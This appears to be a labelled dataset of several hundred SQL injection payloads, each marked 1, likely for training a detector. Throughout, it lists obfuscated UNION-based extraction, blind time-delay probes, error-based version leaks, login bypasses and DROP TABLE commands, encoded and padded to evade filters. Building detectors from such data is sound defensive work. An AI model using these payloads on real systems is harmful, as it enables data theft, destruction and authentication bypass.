"1%29%20UN/*!12345*/ION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"AdmIn'/**/or/**/'1'='1--948n765y64w", 1
"1)UN/*!*/ION%0d%0aSELECT1,database(),3--", 1
"", 1
"tEST'/*!12345*/or/**/'1'='1'/**//*", 1
"%u0027%u0020AND%u00201%3Dconvert(int,@@version)--", 1
"' AND extra%63tvalue(1,co%6ecat(0x5c,%76e%72si%6fn())) OR 'b'LIKE'b'----zz54d4", 1
"'/**//**//**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**//**//**/1/**//**/=	1/**//**//**//**//**//**//**//**//**//**/--/**//**//**//**//**//**//**//**//**//**/", 1
"%u0027/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"1%20XOR%201%3D1", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#7r5joe4t5zdaghy", 1
"1%u0020AND%u00201=1%u0020OR%u0020%u0027b%u0027=%u0027b%u0027", 1
"admin'    OR    '1'  =%09'1", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),0)/*%0a*/#more_noise--", 1
";      DROP      TABLE      users;      --", 1
"adM%69N' Or '1'='1--k%36e4hl%73", 1
"%3B%2520DROP%2520T%2541BLE%20users%3B%20--", 1
"1'UNIONSELECTtable_name,null,nullFROM/*%0a*/information_schema.tables--%0d%0a", 1
"test%27%20OR%20%271%27%3C%3D%271%27%20--%20", 1
"' OR EXISTS(SELECT 1 FROM users)----ljoxfz", 1
"'/**/OR%09%091	=%201%09%09 /*!*/AND 1=1--%09%09#m4xsfh", 1
"1%u0027%u0020aNd%U0020SubsTRINg(dATaBaSe(),%u00201,%U00201)%u0020<=%u0020%u0027S%U0027%u0020--", 1
"1%u0027/**/AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"test'OR/*%0d%0a*/'1'='1'/*%0a*//*/*%0d%0a*/", 1
"; DROP TABLE users; --#04iv7aqpu5z5", 1
"test%u0027%u0020O/*!12345*/R%u0020%u00271%u0027=%u00271%u0027%u0020 # more_noise--%u0020", 1
"1)/**/UNION SELECT 1,database(),3----lbfxq", 1
"1%29%29%25u0020UNION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3 -- random_noise--", 1
"%27%20or%201L%49KE1%2%30%2d-%20", 1
"; SELECT p%67_%73l%65ep(5); --", 1
";DROP/*%0d%0a*/TABLE", 1
"users;%0a--", 1
"aDMIn%27%20oR%20%271%27In%20%281%29%271", 1
"%27%09%09%09%09AND%09%09%09%09extractvalue(1,concat(0x5c,version()))%20OR%20(1)--", 1
"%27AND1%3D1--%250a", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#76ms3", 1
"%27%20AND%201%3C%3D1%20--%20", 1
"test%27%20O/*!*/R%20%271%27%3D%271%27%20%2F%2A	OR	(1)", 1
"1aND%0A1=1%0D%0a/**/--/**/RANDom_NOIsE", 1
"'/**/XOR/**/1LIKE1/**/--/**/#5ily9azae", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#dl62u4k4e", 1
"%u0027ANDextractvalue(1,concat(0x5c,version()))--%0a", 1
"1%27ORIF%28substring%28database%28%29%2C%2F%2A%250d%250a%2A%2F1%2C%250a1%29%3D%27a%27%2CSLEEP%285%29%2C0%29%0A--", 1
"waITF%254fr%2F%2A%2A%2FDe%256caY%20%27%2530%3A0%3A5%27--", 1
"%27/**/AND/**/1%3Dconvert(int,@@version)--", 1
"1'     UNION     SELECT     table_name,     null,     null     FROM     information_schema.tables     --", 1
"%27%09%09UNION%09%09SELECT%09%09null%2C%09%09null%2C%09%09null%09%09--%09%09", 1
"1'/*!*/       UNION        SELECT        table_name,        null,        null        FROM        information_schema.tables         || (1)--", 1
"%U0027%u0020oR%U0020eXISts(SELECt%U00201%u0020fRom%u0020usERS)--", 1
"%27%20UNION%20SELECT%201,2,3 OR 'b'='b'----vvfmlb9i9do5vn9", 1
"WA%49TFORDELAY'0:0:5'%2d%2d#%0d%0amore_noise%0d%0a", 1
"%27%20%20%20OR%20%20%20%31%3d1%20%20%20--%20%20%20", 1
"1) UNION SELECT 1,database(),3--#ym4qkycs6o", 1
"1%27%20Or%20i%46%28%73UBSTr%69n%47%28d%61tabase%%328%29%2C%201%2%43%201%2%39%3D%27a%27%2C%20SlEeP%285%29%2C%20%30%29%20--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020 OR 'b'='b'--", 1
"test'/**/XOR/**/'1'IN (1)'1'/**//*", 1
"1'/*!*/OR%20%20IF(substring(database(),%20%201,%20%201)%20=%20'a',%20%20SLEEP(5),%20%200)%20%20--", 1
"ADMiN%U0027%u0020o/**/r%U0020%U00271%u0027=%U00271", 1
"1' %4fR AsCIi(suB%73T%72iNG(DATaBAS%65(), 1, 1)) > %31%300  oR 'B'='b%27--", 1
"1%27%2F%2A%2A%2FOr%2F%2A%2A%2FASCii%28SUbstRing%28dATAbAsE%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F--", 1
"%25u0027%2F%2A%21%2A%2FUNION%25%25750020SELECT%25u002%25301%2C2%2C%2533-%252d", 1
"1)UNIONSELECT/*%0d%0a*/1,database(),3", 1
"OR(1)--", 1
"%2531%27%20AND%20su%2562string%28database%2528%29%2C%201%2C%201%29%2520LIKE%20%27s%27%20%252d-", 1
"1%u0027/**/A/*!12345*/ND/**/substring(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--", 1
"1%29%29%20Union%20seLeCT%201%2cdATabasE%28%29%2c3--", 1
"1)%20%20%20%20UNIOn%20%20%20%20SELecT%20%20%20%201,DAtABASe(),3%20%20%20%20xoR%20%20%20%20'B'%20=	'b'--", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))/**//*!*/AND/**/1=1--", 1
"%u0027%u0020UNION%u%30020SELECT%u00%320%31,2,3%2d-", 1
"%27%20%55NION%20SELE%43T%20null,%20null,%20null%20%20%41ND%20%27a%27%3D%27%61%27--%20--u23bhv", 1
"test'/*!*/OR%20'1'< =  '1'%20--%20#vcp1yrg4q", 1
"adm%69n' OR %271'='1", 1
"1))UN/*!%2a/ION", 1
"SE%4cEC%54%0d%%30a1,database(%29,3--/*%0d%0a*/", 1
"1%2527%2520oR%2520if%28sUbsTRing%28dAtAbAse%28%29%2C%25201%2C%25201%29%253d%2527A%2527%2C%2520sleep%285%29%2C%25200%29%2520--", 1
"'/**/OR/**/1IN/**/(1)1/**//**/AND/**/'a'='a'--/**/", 1
"'UNIONSELECT%0d%0a1,2,3--", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--#sxix34fflq", 1
"%27%20Or%20%271%27%3D%2527%2531", 1
"test' |%7c (1<=1)'%31'%3d'1%27 /*#563z9nx", 1
"1'  OR  IF(substring(database(),  1,  1)<%09=  'a',  SLEEP(5),  0)  --", 1
";%2f**/DROP T%41BLE users; %2d-", 1
"test' OR '1'='1' /*#wen5z4zduwcq7fo", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20OR%20%281%29--", 1
"1%27/**/or/**/ascii(sUBStriNG(dATABaSe(),/**/1,/**/1))/**/%3E/**/100/**//**//*!*/and/**/1%3D1--", 1
"1'%20%20%20%20%20uN/*!*/iOn%20%20%20%20%20sELEct%20%20%20%20%20TABLe_Name,%20%20%20%20%20nUlL,%20%20%20%20%20null%20%20%20%20%20From%20%20%20%20%20inFORmatioN_SCHEma.TABlES%20%20%20%20%20--", 1
"WAITFor delAY '0:0:5'--", 1
"' || '1'='1 /*!*/AND 1=1--5srscjg", 1
";DROP%0aTABLE", 1
"users;--%0d%0a", 1
"1'			OR			ascii(substring(database(),			1,			1))			>			100			--", 1
";dROpTAbleUSers;", 1
"/*!*/AND%0a1=1--", 1
"", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**//*!12345*/OR%09%09'b' =%09'b'--", 1
"'OREXISTS(SELECT", 1
"1%0d%0aFROM/*%0a*/users)--", 1
"' OR exISTs(sElect 1 FrOM USErS)--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)/**//*!*/AND/**/1=1--", 1
"; SELECT pg_sleep(5); ----y9hq7wo78e", 1
"'AND/*%0a*/extractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"1%27%20OR%20If(SUBStrING(DaTabAsE(),%201,%201)%3d%27a%27,%20SLeep(5),%200)%20--", 1
"%3b%20SELECTpg_sle%65p%285);/*%0d%0a*/-%2d--81m536dxcn0kp9z", 1
"test'/*!*/OR '1'IN (1)'1' --", 1
"'an%44%0d%0a1=1%20--/*%0d%0a*//*%0d%0a*/", 1
"1%27ORIF%28substring%28database%28%29%2C%0A1%2C1%29%3D%27a%27%2CSLEEP%285%29%2C0%29--", 1
"1'ANDsubstring(database(),1,1)%0a%20IN (1)%20's'/*%0a*/--%0a", 1
"1%27%20OR%20asc%69i(substri%6eg(%64a%74ab%61se(),%201,%201))%20%3E%20100%20/*!12345*/OR 'b'='b'--", 1
"1%u0020aND%U00201=1", 1
"1AND%2F%2A%250a%2A%2F1%3D1%2F%2A%250d%250a%2A%2F AND 'a'='a'", 1
"' or eXIsts(sELeCT 1 FROm uSeRS)--", 1
"1'OR%0aascii(substring(database(),1,1))%0a>100--/*%0a*/", 1
"admin'/**/OR/**/'1'='1 OR 'b'='b'", 1
"1'ANDsubstring(database(),1,1)%09>=	/*%0d%0a*/'s'%0d%0a#more_noise--", 1
"test'	XOR	'1'%09=%09'1'	--", 1
"'OR", 1
"1=1--", 1
"1))/**/UNION SELECT 1,database(),3----1zchiwebmwvs1jc", 1
"1'     AND     substring(database(),     1,     1)     IN     (1)     's'     --", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%20%20%3D%20%271%27%20%20%20%20/*", 1
"1'UNIONSELECT%0d%0atable_name,%0d%0anull,null/*%0a*/FROMinformation_schema.tables----7yvv7", 1
";DROP", 1
"TABLEusers;%0%64%0a/*!*/A%4e%44%0d%%30a1=1--", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**//**/OR/**/'b'>='b'--#zhiw067", 1
"WA%49TFOR D%45LAY %270:0:5' AND 'a'='a'--%2d-hvdei8lam", 1
"1%27%20aNd%20suBsTrING(DAtABAse(),%201,%201)%20%3D%20%27S%27%20--", 1
"'          OR          EXISTS(SELECT          1          FROM          users)--#bjmd1q", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20/**/OR/**/'b'='b'--", 1
"%27%20UniOn%20Select%201,2,3 /*!*/AnD 1=1--", 1
"1%27%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%20table_name,%20%20%20%20null,%20%20%20%20null%20%20%20%20FROM%20%20%20%20information_schema.tables%20%20%20%20--", 1
"1%27%2F%2A%2A%2FUN/*!*/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--", 1
"1'        UNION        SELECT        table_name,        null,        null        FROM        information_schema.tables         AND 'a'='a'----uhbj8xjg", 1
"1' A%4eD %73ubstr%69ng(databa%73e(),%201%2c 1) = 's'  # more_noise----64m8zephszlzgls", 1
"'OR/*%0d%0a*/'1'LIKE'1", 1
"", 1
"1%25u002%2537%2F%2A%2A%2FUN%2549ON%25u0020SELECT%25u0020t%2561ble_name%2C%25u%2530020null%2C%25%25750020null%25u0020FROM%25u0020i%256ef%256frmation_sche%256da%252etables%25%25750%253020--", 1
"1AND%0d%0a1=1%0aOR%u0027b%u0027=%u0027b%u0027/*%0a*/", 1
"admin'OR%0a'1'='1--qqzr0o3tu", 1
"admin'||", 1
"/*%0a*/'1'", 1
"=%20'1", 1
"1%27/**/anD/**/SUbstRING(datAbAse(),/**/1,/**/1)/**/%3D/**/%27s%27/**/--#56inF", 1
"1%29%29%2520UNION%2520SELECT%25201%2Cdatabase%28%29%2C3--%23gp1ba3", 1
"1 AND 1<=%31 OR (1)", 1
"test%27%20OR%20%271%27%3D%271%27%20/*%20/*!*/AND%201%3D1", 1
"1%u0027/*!12345*//**//**//**//**//**/AND/**//**//**//**//**//**/substring(database(),/**//**//**//**//**//**/1,/**//**//**//**//**//**/1)/**//**//**//**//**//**/%09=%09/**//**//**//**//**//**/%u0027s%u0027/**//**//**//**//**//**/--", 1
";SELECTpg_sleep(5);/*%0d%0a*/--", 1
"", 1
"1%27ANDsubstring%28database%28%29%2C1%2C%2F%2A%250d%250a%2A%2F1%29%250aLIKE%27s%27--", 1
"tEsT%27%20||%20(1%3D1)%271%27%3D%271%27%20--%20", 1
"tes%74%u0027%u0020%u0020%4fR%u0020%u0020%u00271%u0027%%309=%u0020%u0020%u00271%u0027%u0020%u0020%u0020%20#%u0020%u0020more_noise-%2d%u0020%u0020", 1
"%u0027OREXISTS(SELECT1%0d%0aFROMusers)--", 1
"", 1
"'/**/||/**/'1'='1#c754e07wothf", 1
"TeST%27%20oR%20%271%27%3D%271%27%20--%20--3ug1v8os0j", 1
"Test'/*!*/or '1'='1' /*", 1
"%u0027/**/UNION/**/SELECT/**/null,/**/null,/**/null/**//**/OR/**/(1)--/**/", 1
"te%73t'O/*!*/R%20'1'='%31'--%0A", 1
"", 1
"1%20AND%%3201%3D1/*!*/# mo%72e_%6eoise", 1
"1'O/*!12345*/Rascii(substring(database(),/*%0a*/1,1))>100--#di2cczu7s", 1
"'/**/U%4eI%4fN        SE%4cECT        null,        nul%6c,        null        --", 1
"test%27%20OR%20%271%27%3D%271%27%20/*%20OR%20%27b%27%3D%27b%27", 1
"%27%20OR%201%3D1%20--%20%23ip43z7f4hj", 1
"%%327%20O%52%20%271%%327%3D%2%371/*!12345*/AND 'a'='a'", 1
"%27  Or%20'1'	IN (1) '1", 1
";%20SELECT%20pg_sleep(5);%20/**/AND/**/'a'='a'--", 1
"%u0027%u0020AND%u00201%3C%3D1%20%2d-%u0020", 1
"1' AND substring(database(), 1, 1) = 's' --#aqfyozo0qm1", 1
"1%u0020A/**/ND%u00201%3D1", 1
"test%27OR%0d%0a%271%27%3D%271%27/*", 1
"%27%20AN%64%201%3DCONVEr%74(INt,%40@vErsiO%4e)--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A # more_noise", 1
"'/*!*/&& 1=1 -- #kvf8jbbhp6g", 1
"test%27OR/*%0a*/%271%27%3D%271%27/*%0a*//*/*%0a*/--7k98ztecq9im1od", 1
"TesT'OR'1'In(1)'1'/*%0A*/--%0A", 1
"1'/**/or/**/If(sUBstrinG(DATABAse(),/**/1,/**/1)='A',/**/SlEep(5),/**/0)/**/----s3k1m", 1
"teST' or '1'='1' --", 1
"' and 1<=coNVeRT(INT,@@VeRsIOn) OR (1)--", 1
"'/**//**//**//**//**//**//**//**/OR/**//**//**//**//**//**//**//**/EXISTS(SELECT/**//**//**//**//**//**//**//**/1/**//**//**//**//**//**//**//**/FROM/**//**//**//**//**//**//**//**/users)/**//**//**//**//**//**//**//**//*!*/AND/**//**//**//**//**//**//**//**/1/**//**/=%091--", 1
"adMiN'/**/||/**/(1	= 1)'1'	= '1", 1
"' uNiON seLEcT nuLL, nUll, nuLl --", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20 -- random_noise--#bioovk", 1
"' || (1=1)EXISTS(SELECT 1 FROM users)----zoxmhf5bc", 1
"%27%20OR%20%271%27%3D%271#2fvdx8ed2swipjh", 1
";/*!*/   DROP    TABLE    users;    --", 1
"%27%20%7C%7C%20%271%27%3D%271#5xwn6eh3tvm", 1
"'/**/Or/**/'1'='1", 1
"test' OR '1'='1%27 /%2a", 1
"1))/**/UNION/**/SELECT/**/1,database(),3%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
"1'/**/U%4eIO%4e/*%2a%2fSELEC%54/**/tabl%65_name%2c/**/null,/**/null/**/FROM/**/information_schema.t%61%62les/**/--#3zbpwnu%32b%79kj", 1
"'/**/ANDext%72a%63t%76alue(1,co%6ecat(%30x5c,version()))--", 1
"", 1
"WAITFORDELAY/*%0d%0a*/'0:0:5'/**/OR/**/'b'='b'--/*%0d%0a*/", 1
"%u0027%u0020||%U0020%U00271%u0027=%U00271", 1
"1)uNion/*%0d%0a*/SElecT/*%0a*/1,DaTaBase(),3----52jOdojCqKx%0d%0a", 1
"1' XOR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'----ru38vmy3v", 1
";%20SELECT%20pg_sleep(5);%20/*!*/-- random_noise--#1b4rwc5j", 1
"1%u0027%u0020xoR%u0020AsciI(sUBSTRiNG(dATaBAsE(),%u00201,%u00201))%u0020>%u0020100%u0020--#k0i9F99bn", 1
"1' oR asCiI(sU%42stRIng(DatA%62AsE%28%29, 1, 1))%20> 100 --", 1
"1'/**/Or/**/ASCII(SUBSTRing(DATabASe(),/**/1,/**/1))/**/>/**/100/**/----nWT3cP5", 1
";/**/S%45LEC%54%20pg_sleep(5);%20--", 1
"1%27%2F%2A%2A%2FU%254eION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ft%2561bl%2565_na%256de%2C%2F%2A%2A%2Fnull%2C%2520null%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_sch%2565ma%252et%2561bles%2F%2A%2A%2F--", 1
"1'        OR        IF(SUBSTrinG(dataBasE(),        1,        1)	= 'A',        SLEeP(5),        0)        --", 1
"1%27%2%30oR%20aS%63II%28SuBSTRiNG(dATABAS%65(%29,%201,%201))%20%3E%2%30100%20--", 1
"1'/*!*/uNiOn    seLect    tABLE_name,    NulL,    NuLl    FRom    iNfoRmAtIon_sCHemA.TaBLeS    ----pmezngm", 1
"1))			UNION			SELECT			1,database(),3--", 1
"'/**/oR ExIsT%53%28SeleCt %31 FroM %75sERs)--", 1
"'/**/AN%44/**%2fe%78t%72ac%74value(1,concat(0x5c,versio%6e()))--", 1
"test'%20%20OR%20%20'1' = '1'%20%20--%20%20", 1
"%27%20AND%2%30extractvalu%65%281%2Cc%6fnca%74%280x5c%2Cversion%2%38%%329%29%29 # more_%6eoise--%23j%68p5k2", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--#aszyf5d0", 1
"' A%4ed 1  =%20coNVEr%54(inT,@@VERS%49oN)--", 1
"%27%2520A/**/ND%25201%2520%3D%20%201%2520--%2520", 1
"1%27%20oR%20ASciI(suBstRing(DaTABASe(),%201,%201))%20%3e%20100%20----p8ujz5e25qhdoal", 1
"%u0027/*!*/OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--", 1
";SELECT/*%0d%0a*/pg_sleep(5);%0a--%0d%0a", 1
"'/%2a!%2a/AND1=1%0a--%0a#%61%33tnrcrn7n6xx9/*%0a*/", 1
";%20DROP%20TABLE%20users;%20--#7x0rvy", 1
"1) unioN SelecT 1,DATaBASE(),3--", 1
"test'/*!*/OR'1'<='1'/*%0d%0a*//*", 1
"", 1
"test'  OR  '1' =%09'1'  --  --wgtpdatc6", 1
"%2527%2520Or%2520%25271%2527%253d%25271", 1
"'OR", 1
"'1'%09=%09'1", 1
"%3B%20SeLEct%20Pg_slEeP%285%29%3b%20--", 1
"1)) UNION SELECT 1,database(),3 AND 'a'='a'----fe78fcf", 1
"admin'%20OR%20'1'	IN (1) '1%20/*!*/AND%201	= 1", 1
"'    Or    '1'%09=  '1", 1
"1))UNION%0d%0aSELECT/*%0d%0a*/1,database(),3----2wmg7erw04pkfe%0d%0a", 1
"'oR1=1", 1
"--#tee6iq", 1
"%27AND1%3D1%250a--random_noise--", 1
"1'oRif(subSTrinG(dAtABAsE(),1,", 1
"1)LIKE'a',SLeEP(5),/*%0a*/0)--", 1
"'and/*%0d%0a*/eXtracTvaLue(1,CoNcat(0X5c,versIOn()))--/*%0a*/", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--#i39uqly7", 1
"1%29%20uNIOn%20SeLecT%201%2CdaTAbaSe%28%29%2C3--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--random_noise--%0a", 1
"1))/**/UNION SELECT 1,database(),3--#1uwlqvyuw", 1
"%u0027/**/O/*!*/R/**/1=1/**/--/**/", 1
"test'/*!*/|| (1IN (1)1)'1'='1' /* # more_noise", 1
"1'/*!*/OR ascii(substring(database(), 1, 1)) > 100 ----gqwno61gs66a", 1
"'%20OR%201=1 --", 1
"adm%69n%%75002%37%u%30020OR%%750020%u00271%u0027=%u00271", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)	=%20%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"%74EST'			XOR			%271'%20=%20%271'			--", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/--#9kz1s9ajqcnbesa", 1
"'%20Uni%6fn S%65lECT 1,2,3--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#0z4ca4hd6", 1
"1)) unION SElEct 1,dATaBaSe(),3--", 1
"AdmiN'%20or%20'1'%20=/**//**/'1", 1
"admin%27%20OR%20%271%27%3D%271%20OR%20%27b%27%3D%27b%27", 1
"admin'OR%0a'1'='1/*%0d%0a*/--xg7cpi", 1
"1))UNIONSELECT/*%0d%0a*/1,database(),3--", 1
"", 1
"'UNION/*%0a*/SELECT1,2,3#more_noise----spzorb2wlh", 1
"WAITfor DElAy '0:0:5'--#QN73yMHhHtM3T", 1
"1'/**/uNIonSElEctTablE_nAmE,nUll,NULl%0afrom", 1
"infOrmAtIoN_sCHEMA.TablES--", 1
"'/*!*/AND extractvalue(1%2cconcat(0x5c,v%65%72sion(%29))%2d- && (1=1)'a'='a'", 1
"' UNION SEL%45C%54 null, null%2c null -%2d", 1
"%2574est%2527%252%2530OR%2520%25271%2527%253D%2527%2531%2527%2520%2F%2A", 1
"1%27%09%09%09%09OR%09%09%09%09AsCIi%28sUBsTRIng%28dAtabAsE%28%29%2c%09%09%09%091%2c%09%09%09%091%29%29%09%09%09%09%3E%09%09%09%09100%09%09%09%09--", 1
"test'/**/OR '1'='1' /* AND 'a'='a'", 1
"' AND 1=cOnverT(iNt,@@vERSIoN)--", 1
"%27/**/UN/*!12345*/ION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"'					AND					EXTractvAlU%65(1%2ccoNCat(0X5c%2C%76E%72siON()))--", 1
"1%25u0027%25u0020ANd%25u0020sUbsTrING%28datABaSE%28%29%2C%25u00201%2C%25u00201%29%25U0020LIKE%25u0020%25u0027S%25U0027%25u0020--", 1
"%u0027%U0020An%44%u0020%31=1%u002%30--%u00%320", 1
"1' OR %61scii(SUB%73TrIng(daTaBasE(),%201, 1))%20> 100 --#%6e9yhf%6aDZmaq6%71", 1
"%u0027OR%0d%0a1=1%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--/*%0a*/#8jpjgropbg4w", 1
"%27UNIONSELECTnull%2Cnull%2C%2F%2A%250a%2A%2Fnull%250a--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 AND 'a'='a'--", 1
"1'%09%09%09UNION%09%09%09SELECT%09%09%09table_name,%09%09%09null,%09%09%09null%09%09%09FROM%09%09%09information_schema.tables%09%09%09 -- random_noise--", 1
"1'ANDsubstring(database(),", 1
"1,1)LIKE%0a's'", 1
"--", 1
"; DROP TABLE users; --#d5u6hi2", 1
"%u0027%u0020AND%u00201=convert(int,@@version)%u0020O/**/R%u0020(1)--", 1
"%u0027%u0020anD%u0020eXTrACtVa%6CuE(%31,CONCat(%30X5%63,VERsIon()%29)--", 1
"%27%%320or%201%3D1%20--%2%30", 1
"; SeLECT pG_SleEP(5); --", 1
"%27/**/AND%20e%78tractval%75e(1,conca%74(0x5c,%76e%72sio%6e()))%20--%20rando%6d_noise--", 1
"'%20AND e%78tractvalue(1,c%6fncat(0x5c,%76ersio%6e()))--", 1
"ADmiN' or '1'IN (1)'1", 1
"1%u0027/*!*/unioN%u0020selEct%u0020TAbLE_naMe,%u0020nULl,%u0020NuLl%u0020FRom%u0020informATion_SCHeMa.taBLes%u0020--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20 AND 'a'='a'--%20#bhhmqsh3", 1
"%27/**/OR/**/%271%27%3D%271 OR (1)--9xsv1mvx8uy", 1
"' OR %271'='%31", 1
"' AND e%78tra%63tvalue(1,concat(0x5c,versi%6fn(%29)%29--", 1
"1) UNION SELECT 1,database(),3 -- random_noise--", 1
"1)UN/**/ION%0d%0aSELECT/*%0a*/1,database(),3--%0a--2t1t554", 1
"test%27O/*!*/R", 1
"%271%27%3D%271%27%0d%0a/*%0d%0a AND 'a'='a'", 1
"%u0027XOR1>=1/*%0d%0a*/--%0a/*%0d%0a*/", 1
"%27%20Union%20sElect%20nULL,%20NUll,%20nUlL%20--%20", 1
";SELECT%0d%0a/*%0a*/pg_sleep(5);--", 1
"1%u0027%u002%30UN%49%4fN%u0020SELECT%%75%30020table%5fn%61me%2c%%750020null%2c%u0020null%u0020FR%4fM%u0020information_schema.tables%u0020%20/*!*/AND%201%3D1--", 1
"1%u0027%u0020O%52%u0020asci%69(su%62string(data%62ase(),%u0020%31,%u00201))%u0020>%u0020100%u0020--", 1
"%3B%2520Selec%74%2520P%47_Sleep%285%2%39%3B%25%320--", 1
"' UNION S%45LEC%54 1,2%2c3 /*!*/A%4eD 1<=%31----krr3z", 1
"1) UNION SELECT%201%2cda%74a%62ase(),3--", 1
"' OR 1>=1 -- --40vcss8tf1em8ie", 1
"%27UNIONSELECTnull,null,null/*%0d%0a*/--%0a", 1
"%27%%320UnIoN%20sEl%45%43t%20nulL,%20null,%20%6E%75ll%20--%20", 1
"%2527%2520AND%25201%253C%253D1%2520--%2520--8z5zvhs83ioo", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--#fdeqr", 1
"1)%u0020%55NI%4f%4e%u0020SELECT%u0020%31,da%74abase(),3----25u4uvga7won52", 1
"1%29%2F%2A%21%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3----3jbjz2", 1
"1'/*!*/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--", 1
"%27					O/*!12345*/R					%271%27%20%3D	%271", 1
"%3B%2F%2A%2A%2%46DROP%20%54ABL%45%%320u%73ers%3B%%320%20--%20random_noise--", 1
"admin' OR '1'='1--fq4ervme1iam", 1
";%09%09%09%09%09SELECT%09%09%09%09%09pg_sleep(5);%09%09%09%09%09--", 1
"'OR/*%0a*/EXISTS(SELECT1FROMusers) # more_noise--/*%0a*/", 1
";DROPTABLEusers; AND 'a'='a'--", 1
"", 1
"%27%20AND%201%3D1%20--%20--qp89wpbf72u", 1
"1'				OR				IF(substring(database(),				1,				1)%20=/**/ 'a',				SLEEP(5),				0)				--", 1
"1'      OR%20%49F(substring(da%74abase(%29,%201,      1)  =%20'a',      SLEEP(5),      0)      %2d-", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"' aNd eXtraCtvaLue(1,COncAT(0x5C,VERSIon()))--#iqmw812k7", 1
"1/**/AND/**/1=1%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--g3af33", 1
"TES%74%2%37%20oR%20%271%%327%3d%271%27%20--%2%30", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)<='a',/**/SLEEP(5),/**/0)/**/--", 1
"t%65st'%2f*%2a/OR/**/'1' =	'1'/**/--/*%2a/", 1
"; SElE%63T %50G_%73LEeP(5); --", 1
";/*!12345*/DROP%u0020TABLE%u0020users;%u0020--#j9mu1cc", 1
"%27 OR 1=%31  %4fR 'b'='b'-- #ciizz684c%61", 1
"waItfor%20%20DElay%20%20%270:0:5%27--", 1
"%3B%09%09%09%09%09seLect%09%09%09%09%09pg_SlEEp%285%29%3B%09%09%09%09%09--", 1
"%u0027%u0020OR%u0020%u00271%u0027  = %u00271", 1
"1'        AND        substring(database(),        1,        1)         =          's'        --", 1
";%U0020DRoP%u0020TABLE%U0020UseRS;%u0020--", 1
"1/*!*/AND%201%3D1", 1
"adm%69n%27/**/OR%20%271%27%3D%271", 1
"1)) UNION SELECT 1,database(),3----qo0gw4j", 1
"%27OR1%3d1%0d%0A--/*%0A*/", 1
"'UNIONSELECT%0a1,2,3--", 1
"admin%27%2F%2A%21%2A%2FOR%20%271%27%3D%271#zjwm2hczp0owu", 1
"1' And SubStrINg(dATABasE(), 1, 1) = 'S' --", 1
"%27%20aND%20eXtraCtvAlUe(1,ConCAT(0x5C,VeRSiOn()))--", 1
"%27%20AND%20%65xtractv%61lue%281%2cconc%61t(0x5c,version()))----ex9v7tpwg6soif", 1
"1'/*!12345*/OR			ascii(substring(database(),			1,			1))			>			100						AND			'a' =%20'a'--#1sh8177acx9vvy", 1
"1'UNION/*%0a*/SELECTtable_name,null,%0anullFROM%0ainformation_schema.tables/*!12345*/# more_noise--", 1
"test'/**/OR/**/'1'='1'/**//**//*!*/AND/**/1=1--/**/--c2aimg2dd16", 1
"admin%%327%20%4f/*!*/R%20%271%27%%33D%271", 1
"%27					OR					%271%27%20%3D%20%271", 1
